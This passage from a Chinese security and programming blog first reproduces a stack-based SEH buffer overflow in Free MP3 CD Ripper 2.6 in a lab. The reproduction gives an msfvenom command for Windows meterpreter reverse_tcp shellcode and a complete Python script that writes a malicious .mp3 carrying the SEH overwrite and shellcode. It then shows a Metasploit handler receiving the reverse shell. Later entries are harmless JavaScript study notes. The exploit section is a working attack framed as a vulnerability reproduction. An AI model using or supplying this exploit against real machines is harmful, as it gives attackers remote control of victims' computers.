<p><strong>ip**</strong>：192.168.6.146** </p>
<p><strong>受害机：win10</strong>   </p>
<p><strong>ip**</strong>：192.168.6.142**</p>
<p><strong>安装Free MP3 CD Ripper 2.6版本</strong></p>
</blockquote>
<h2 id="1、搭建环境"><a href="#1、搭建环境" class="headerlink" title="1、搭建环境"></a><strong>1、搭建环境</strong></h2><ul>
<li><strong>Win10</strong>下载安装Free MP3 CD Ripper 2.6版本</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756071.png!small"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756090.png!small"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756100.png!small"></p>
<ul>
<li><strong>利用msf生成反向连接的shellcode</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.6.146 lport&#x3D;888 -f c --smallest</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756107.png!small"></p>
<ul>
<li><p><strong>替换脚本中的shellcode.</strong></p>
</li>
<li><p><strong>编写生成.Mp3文件的脚本</strong></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Stack-based buffer overflow in Free MP3 CD Ripper 2.6</span><br><span class="line"></span><br><span class="line">buffer&#x3D;&quot;A&quot;*4116</span><br><span class="line">NSEH&#x3D;&quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">SEH&#x3D;&quot;\x84\x20\xe4\x66&quot;</span><br><span class="line">nops&#x3D;&quot;\x90&quot;*5</span><br><span class="line">buf&#x3D;&quot;&quot;</span><br><span class="line">buf&#x3D;&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><br><span class="line">buf&#x3D;&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="line">buf&#x3D;&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><br><span class="line">buf&#x3D;&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><br><span class="line">buf&#x3D;&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><br><span class="line">buf&#x3D;&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><br><span class="line">buf&#x3D;&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><br><span class="line">buf&#x3D;&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><br><span class="line">buf&#x3D;&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><br><span class="line">buf&#x3D;&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;</span><br><span class="line">buf&#x3D;&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;</span><br><span class="line">buf&#x3D;&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x6e\x84&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\x02\x00\x03\x78\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;</span><br><span class="line">buf&#x3D;&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0&quot;</span><br><span class="line">buf&#x3D;&quot;\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8&quot;</span><br><span class="line">buf&#x3D;&quot;\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68&quot;</span><br><span class="line">buf&#x3D;&quot;\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3&quot;;</span><br><span class="line"></span><br><span class="line">pad&#x3D;&quot;B&quot;*(316-len(nops)-len(buf))</span><br><span class="line">payload&#x3D;buffer+NSEH+SEH+nops+buf+pad</span><br><span class="line">try:</span><br><span class="line">    f&#x3D;open(&quot;Test_Free_MP3.mp3&quot;,&quot;w&quot;)</span><br><span class="line">    print (&quot;[+]Creating %s bytes mp3 Files...&quot;%len(payload))</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.close() </span><br><span class="line">    print (&quot;[+]mp3 File created successfully!&quot;)</span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">    print (&quot;File cannot be created!&quot;)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756330.png!small"></p>
<ul>
<li><strong>运行脚本，生成一个.MP3的文件</strong></li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756343.png!small"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756349.png!small"></p>
<ul>
<li><strong>将生成的.mp3文件放到win10上（需要VMtools）</strong></li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756378.png!small"></p>
<ul>
<li><strong>kali</strong>开启msfconsole</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756395.png!small"></p>
<ul>
<li><p><strong>使用exploit/multi/handler模块</strong></p>
</li>
<li><p><strong>设置lhost,lport,攻击载荷</strong></p>
</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756416.png!small"></p>
<ul>
<li><strong>Kali</strong>开启监听：</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756435.png!small"></p>
<ul>
<li><strong>Win10</strong>使用free MP3 CD ripper 打开mp3文件</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756451.png!small"></p>
<ul>
<li><strong>接收反弹的</strong>shell</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756479.png!small"></p>
<p><strong>执行命令</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756510.png!small"></p>
<ul>
<li><strong>漏洞利用成功</strong></li>
</ul>
<blockquote>
<p><strong>PS: 说一个我踩的坑吧，真的头一次遇到这种情况:</strong></p>
<p>漏洞利用攻击机需要用kali2019版本，2020版本不可以利用。用2020试了好多遍都没有成功，最后鬼使神差的用了2019就成功了。有遇到过这样情况的大佬分享一下经验吗。</p>
</blockquote>
<h2 id="2、修复建议"><a href="#2、修复建议" class="headerlink" title="2、修复建议"></a><strong>2</strong>、修复建议</h2><p>及时更新Free MP3 CD Ripper到最新版本</p>
<p>参考链接：<a href="https://blog.csdn.net/weixin_46132680/article/details/104366335">https://blog.csdn.net/weixin_46132680/article/details/104366335</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CoAP协议笔记(暂空)</title>
    <url>/CoAP%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<p>暂空，将之后要学习的内容列出来</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>CoAP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X02)</title>
    <url>/JS_0X02/</url>
    <content><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>当字符串中包含<code>‘</code>或者<code>“</code>时，需要转义，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="多行字符串"><a href="#多行字符串" class="headerlink" title="多行字符串"></a>多行字符串</h2><p>用反引号`表示，就是Tab上面哪个键，1左边那个键。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`王火火</span></span><br><span class="line"><span class="string">可</span></span><br><span class="line"><span class="string">不太</span></span><br><span class="line"><span class="string">捞</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>


<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p><code>感觉就像是引用变量，像python的format</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;小明&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> message = <span class="string">`你好, <span class="subst">$&#123;name&#125;</span>, 你今年<span class="subst">$&#123;age&#125;</span>岁了!`</span>;</span><br><span class="line">alert(message);</span><br></pre></td></tr></table></figure>


<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><blockquote>
<p>相当于<code>py</code>的列表，感觉不难理解，就直接来吧</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">10</span>, <span class="number">20</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>];</span><br><span class="line">arr.indexOf(<span class="number">10</span>); <span class="comment">// 元素10的索引为0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>];</span><br><span class="line">arr.slice(<span class="number">0</span>, <span class="number">3</span>); <span class="comment">// 从索引0开始，到索引3结束，但不包括索引3: [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]</span></span><br><span class="line">arr.slice(<span class="number">3</span>); <span class="comment">// 从索引3开始到结束: [&#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//push()向Array的末尾添加若干元素，pop()则把Array的最后一个元素删除掉</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr.push(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>); <span class="comment">// 返回Array新的长度: 4</span></span><br><span class="line">arr; <span class="comment">// [1, 2, &#x27;A&#x27;, &#x27;B&#x27;]</span></span><br><span class="line">arr.pop(); <span class="comment">// pop()返回&#x27;B&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//unshift:往头部添加新元素</span></span><br><span class="line"><span class="comment">//shift：删除头部第一个元素</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr.unshift(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>); <span class="comment">// 返回Array新的长度: 4</span></span><br><span class="line">arr; <span class="comment">// [&#x27;A&#x27;, &#x27;B&#x27;, 1, 2]</span></span><br><span class="line">arr.shift(); <span class="comment">// &#x27;A&#x27;</span></span><br><span class="line">arr; <span class="comment">// [&#x27;B&#x27;, 1, 2]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>万能方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//splice()方法是修改Array的“万能方法”，它可以从指定的索引开始删除若干元素，然后再从该位置添加若干元素：</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;Microsoft&#x27;</span>, <span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Yahoo&#x27;</span>, <span class="string">&#x27;AOL&#x27;</span>, <span class="string">&#x27;Excite&#x27;</span>, <span class="string">&#x27;Oracle&#x27;</span>];</span><br><span class="line"><span class="comment">// 从索引2开始删除3个元素,然后再添加两个元素:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回删除的元素 [&#x27;Yahoo&#x27;, &#x27;AOL&#x27;, &#x27;Excite&#x27;]</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Google&#x27;, &#x27;Facebook&#x27;, &#x27;Oracle&#x27;]</span></span><br><span class="line"><span class="comment">// 只删除,不添加:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">2</span>); <span class="comment">// [&#x27;Google&#x27;, &#x27;Facebook&#x27;]</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Oracle&#x27;]</span></span><br><span class="line"><span class="comment">// 只添加,不删除:</span></span><br><span class="line">arr.splice(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回[],因为没有删除任何元素</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Google&#x27;, &#x27;Facebook&#x27;, &#x27;Oracle&#x27;]</span></span><br></pre></td></tr></table></figure>

</blockquote>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X03)</title>
    <url>/JS_0X03/</url>
    <content><![CDATA[<h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><p>格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">xxx</span>)</span>&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">ooo</span>)</span>&#123;</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再恶心一点就是：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//俄罗斯套娃</span></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">xx</span>)</span>&#123;</span><br><span class="line">    ...;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">ooo</span>)</span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="用户输入判断"><a href="#用户输入判断" class="headerlink" title="用户输入判断"></a>用户输入判断</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> height = <span class="built_in">parseFloat</span>(prompt(<span class="string">&#x27;请输入身高(m):&#x27;</span>));</span><br><span class="line"><span class="keyword">var</span> weight = <span class="built_in">parseFloat</span>(prompt(<span class="string">&#x27;请输入体重(kg):&#x27;</span>));</span><br></pre></td></tr></table></figure>


<h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    x = x + i;</span><br><span class="line">&#125;</span><br><span class="line">x; <span class="comment">// 50005000,计算从1+2+3+...+10000</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>遍历数组的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Microsoft&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> i, x;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">    x = arr[i];</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">99</span>;</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    x = x + n;</span><br><span class="line">    n = n - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">x; <span class="comment">// 2500</span></span><br></pre></td></tr></table></figure>


<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><blockquote>
<p><code>map</code>相当于<code>py</code>的字典</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">&#x27;Michael&#x27;</span>, <span class="number">95</span>], [<span class="string">&#x27;Bob&#x27;</span>, <span class="number">75</span>], [<span class="string">&#x27;Tracy&#x27;</span>, <span class="number">85</span>]]);</span><br><span class="line">m.get(<span class="string">&#x27;Michael&#x27;</span>); <span class="comment">// 95</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>键值对的“键”不能重复，否则会把之前同名的键的值替换掉</p>
</blockquote>
<h1 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h1><blockquote>
<p>Set有键，无值，并且键会自动去重</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2, 3, &quot;3&quot;&#125;</span></span><br></pre></td></tr></table></figure>






<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X04)</title>
    <url>/JS_0X04/</url>
    <content><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><blockquote>
<p>按我自己用<code>py</code>来理解的话..<code>function</code>相当于<code>def</code> ，<code>abs</code>就是函数名，<code>x</code>是函数内的参数，{…}是函数的内容</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="将函数赋值给变量"><a href="#将函数赋值给变量" class="headerlink" title="将函数赋值给变量"></a>将函数赋值给变量</h2><blockquote>
<p><code>function</code>是一个匿名函数，函数的值给了<code>abs</code>，调用函数的时候只需要调用<code>abs</code>就可以了。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><blockquote>
<p>直接调用，例如：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用函数时，按顺序传入参数即可：</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">abs(<span class="number">10</span>); <span class="comment">// 返回10</span></span><br><span class="line">abs(-<span class="number">9</span>); <span class="comment">// 返回9</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="return的坑"><a href="#return的坑" class="headerlink" title="return的坑"></a>return的坑</h2><blockquote>
<p><code>javascript</code>的自动添加分号机制，会影响如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>实际上会变成：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>所以多行写法要加{}，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line">	<span class="string">&quot;whh6tl&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


</blockquote>
<p>写代码之前尽量加上：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;<span class="comment">//防止全区变量，如a = 1; ，会自动转换成 var a = 1;</span></span><br><span class="line">xxxxxxx;</span><br><span class="line">xxxxxxx;</span><br></pre></td></tr></table></figure>


<h2 id="嵌套函数实例"><a href="#嵌套函数实例" class="headerlink" title="嵌套函数实例"></a>嵌套函数实例</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> whh = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span> : <span class="string">&quot;wdw&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> : <span class="number">12</span>,</span><br><span class="line">    <span class="string">&quot;wheel&quot;</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">9</span>;</span><br><span class="line">        b = a * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X05)</title>
    <url>/JS_0X05/</url>
    <content><![CDATA[<h1 id="标准对象"><a href="#标准对象" class="headerlink" title="标准对象"></a>标准对象</h1><h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p><code>Date</code>对象用来表示日期和时间。</p>
<p>如要获取系统当前时间（获取的是本机时间，本机时间不准的话…<code>emmmmmmmmmmm</code>）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">now; <span class="comment">// Wed Jun 24 2015 19:49:22 GMT+0800 (CST)</span></span><br><span class="line">now.getFullYear(); <span class="comment">// 2015, 年份</span></span><br><span class="line">now.getMonth(); <span class="comment">// 5, 月份，注意月份范围是0~11，5表示六月</span></span><br><span class="line">now.getDate(); <span class="comment">// 24, 表示24号</span></span><br><span class="line">now.getDay(); <span class="comment">// 3, 表示星期三</span></span><br><span class="line">now.getHours(); <span class="comment">// 19, 24小时制</span></span><br><span class="line">now.getMinutes(); <span class="comment">// 49, 分钟</span></span><br><span class="line">now.getSeconds(); <span class="comment">// 22, 秒</span></span><br><span class="line">now.getMilliseconds(); <span class="comment">// 875, 毫秒数</span></span><br><span class="line">now.getTime(); <span class="comment">// 1435146562875, 以number形式表示的时间戳</span></span><br></pre></td></tr></table></figure>
<h2 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp"></a>RegExp</h2><blockquote>
<p>俗称—-正则表达式！就是<code>py</code>的<code>re</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\d <span class="comment">//匹配数字</span></span><br><span class="line">\w <span class="comment">//匹配字母或者数字</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>&#39;00\d&#39;</code>可以匹配<code>&#39;007&#39;</code>，但无法匹配<code>&#39;00A&#39;</code>；</li>
<li><code>&#39;\d\d\d&#39;</code>可以匹配<code>&#39;010&#39;</code>；</li>
<li><code>&#39;\w\w&#39;</code>可以匹配<code>&#39;js&#39;</code>；</li>
<li><code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>&#39;010&#39;</code>；</li>
<li><code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>&#39; &#39;</code>，<code>&#39;\t\t&#39;</code>等；</li>
<li><code>\d&#123;3,8&#125;</code>表示3-8个数字，例如<code>&#39;1234567&#39;</code>。</li>
</ul>
</blockquote>
<h3 id="JS创建正则表达式"><a href="#JS创建正则表达式" class="headerlink" title="JS创建正则表达式"></a>JS创建正则表达式</h3><ol>
<li>直接通过<code>/正则表达式/</code>写出来</li>
<li>通过<code>new RegExp(&#39;正则表达式&#39;)</code>创建一个RegExp对象。</li>
</ol>
<blockquote>
<p>例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re1 = <span class="regexp">/ABC\-001/</span>;</span><br><span class="line"><span class="keyword">var</span> re2 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;ABC\\-001&#x27;</span>);</span><br><span class="line"></span><br><span class="line">re1; <span class="comment">// /ABC\-001/</span></span><br><span class="line">re2; <span class="comment">// /ABC\-001/</span></span><br></pre></td></tr></table></figure>

<p>如果正则表达式中定义了组，就可以在<code>RegExp</code>对象上用<code>exec()</code>方法提取出子串来。</p>
</blockquote>
